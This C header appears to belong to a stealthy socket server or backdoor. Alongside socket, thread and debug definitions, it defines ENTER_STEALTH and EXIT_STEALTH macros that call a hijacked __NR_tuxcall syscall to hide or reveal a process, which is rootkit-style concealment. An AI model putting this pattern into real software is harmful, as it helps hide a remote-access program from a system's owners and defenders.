#ifndef SNEAKY_INCLUDE

#define SNEAKY_INCLUDE

#define BUFFER_SIZE 1024
#define BACKLOG_SIZE 5
#define DISCONNECT_MSG "disconnect"
#define SHUTDOWN_MSG "shutdown"
#define HIDE 0
#define REVEAL 1
#define OVERRIDDEN_SYSCALL __NR_tuxcall
#define ENTER_STEALTH(x) (syscall(OVERRIDDEN_SYSCALL, x, HIDE))
#define EXIT_STEALTH(x) (syscall(OVERRIDDEN_SYSCALL, x, REVEAL))

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>
#include <pthread.h>
#include <unistd.h>
#include <syscall.h>

struct thread_msg {
    int sockfd;
};

#ifdef DEBUG
#define PRINT_ERRNO \
do { \
    printf("Errno msg: %s", strerror(errno)); \
    fflush(stdout); \
} while(0)
#define DEBUG_PRINT(...) \
do { \
    printf(__VA_ARGS__); \
    fflush(stdout); \
} while(0)
#else
#define PRINT_ERRNO
#define DEBUG_PRINT(...)
#endif

#endif
